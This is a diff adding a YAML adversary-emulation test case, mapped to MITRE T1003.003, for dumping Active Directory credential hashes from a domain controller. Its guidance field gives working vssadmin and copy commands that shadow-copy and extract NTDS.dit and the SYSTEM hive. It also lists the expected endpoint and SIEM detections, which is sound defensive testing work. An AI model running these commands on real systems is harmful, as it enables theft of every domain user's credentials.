@@ -1,0 +1,35 @@
+name: Extract NTDS credentials via vssadmin.exe
+description: Dump domain hashes for all domain users on the domain controller via VSS (Volume Shadow Services) by taking a shadow copy of the NTDS.dit file with vssadmin.exe
+metadata:
+  isv: 1
+  tactic: TA0006
+  tid: T1003.003
+  x_vectr_id: 4bf62dcb-0a6e-4805-8536-d17122d956c5
+  x_guidance_id: 86cfeb1a-2053-4385-8be0-7d15a203eacb#2
+platforms:
+- windows
+prerequisites:
+- local_admin
+guidance:
+- 'CMD>
+
+  vssadmin list shadows
+
+  vssadmin create shadow /for={{ drive_letter }}:
+
+  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy{{ copy_number }}\Windows\System32\config\SYSTEM {{ out_dir }}\SYSTEM.hive
+
+  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy{{ copy_number }}\NTDS\ntds.dit {{ out_dir }}\NTDS.dit'
+block:
+- Suspicious process execution/behavior blocked by endpoint security tool
+detect:
+- Suspicious process execution/behavior detected by endpoint security tool
+- Suspicious Volume Shadow Service use detected in the SIEM using telemetry
+- Suspicious file access detected in the SIEM using file system telemetry
+logs:
+- edr:telemetry
+- winevent
+- process_create
+controls:
+- Endpoint Protection
+- SIEM
